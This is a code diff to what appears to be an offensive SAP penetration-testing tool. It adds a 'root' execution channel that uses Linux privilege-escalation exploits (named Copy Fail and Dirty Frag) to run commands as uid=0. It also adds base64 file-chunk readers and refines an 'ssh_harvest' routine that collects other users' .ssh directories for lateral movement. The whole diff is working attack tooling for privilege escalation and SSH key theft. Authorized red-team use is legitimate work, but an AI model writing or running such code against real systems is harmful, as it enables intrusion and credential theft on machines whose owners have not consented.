@@ -57,7 +57,9 @@ SAPMAP_SSH_PRIVKEY = (
 def _make_exec_fn(node: SAPNode, channel: str = "auto"):
     """Build an OS-exec function for the given node and channel.
 
-    channel: "auto" | "gw" | "cve31324" | "sxpg"
+    channel: "auto" | "gw" | "cve31324" | "sxpg" | "root"
+             "root" uses Linux LPE (Copy Fail / Dirty Frag) to run as
+             uid=0 — needed to read other users' .ssh directories.
 
     Returns (exec_fn, channel_label) or (None, error_str).
     exec_fn signature: (cmd: str) -> str  (returns stdout)
@@ -65,6 +67,48 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
     is_windows = "WIN" in (node.os_type or "").upper()
     system_type = (node.system_type or "").upper()
 
+    # --- Root channel (Linux LPE) ---
+    if channel == "root":
+        has_root = (getattr(node, "copyfail_root_obtained", False)
+                    or getattr(node, "dirtyfrag_root_obtained", False))
+        has_lpe = (getattr(node, "copyfail_vulnerable", False)
+                   or getattr(node, "dirtyfrag_vulnerable", False))
+        if not (has_root or has_lpe):
+            return None, ("no Linux LPE available — run 'Escalate to "
+                          "Root' first to check Copy Fail / Dirty Frag")
+
+        def _run_cmd_root(cmd: str) -> str:
+            try:
+                from sapmap_lpe_auto import run_linux_lpe
+                r = run_linux_lpe(node, cmd, timeout=60.0)
+                if r.get("ok"):
+                    return r.get("stdout", "")
+            except Exception as e:
+                logger.debug(f"ssh_lateral root exec: "
+                             f"{format_rfc_exception(e)}")
+            return ""
+
+        def _run_py_root(code: str) -> str:
+            return _run_cmd_root(f"python3 -c {code}")
+
+        def _read_b64_chunk_root(path: str, offset: int, end: int) -> str:
+            code = (f"print(__import__('base64').b64encode("
+                    f"open('{path}','rb').read()[{offset}:{end}])"
+                    f".decode())")
+            out = _run_cmd_root(f"python3 -c {code}")
+            for ln in out.splitlines():
+                ln = ln.strip()
+                if ln and _B64_LINE_RE.fullmatch(ln):
+                    return ln
+            return ""
+
+        _run_cmd_root._read_b64_chunk = _read_b64_chunk_root
+        _run_cmd_root._run_py = _run_py_root
+        label = ("Linux LPE → root ("
+                 + (getattr(node, "linux_lpe_method", "") or "auto") + ")")
+        return _run_cmd_root, label
+
+    # --- Standard channels (sidadm-level) ---
     def _run_cmd(cmd: str) -> str:
         try:
             if channel == "sxpg":
@@ -358,12 +402,24 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         ls_out = exec_fn._run_py(_ls_code)
         if not ls_out or not ls_out.strip():
             continue
-        files = [fn.strip() for fn in ls_out.splitlines()
-                 if fn.strip()]
+        # Filter out Python tracebacks / error lines from SAPXPG
+        _err_prefixes = ("Traceback", "File ", "PermissionError",
+                         "OSError", "External program", "  ")
+        files = []
+        for fn in ls_out.splitlines():
+            fn = fn.strip()
+            if not fn:
+                continue
+            if any(fn.startswith(p) for p in _err_prefixes):
+                continue
+            files.append(fn)
         if files:
             ssh_dirs[ssh_path] = files
             print(f"  [*] {sid}: found .ssh at {ssh_path}: "
                   f"{', '.join(files)}")
+        elif "PermissionError" in ls_out or "Permission denied" in ls_out:
+            print(f"  [*] {sid}: .ssh at {ssh_path}: permission denied "
+                  f"(need root channel)")
 
     print(f"[*] {sid}: ssh_harvest — {len(ssh_dirs)} .ssh directories")
 
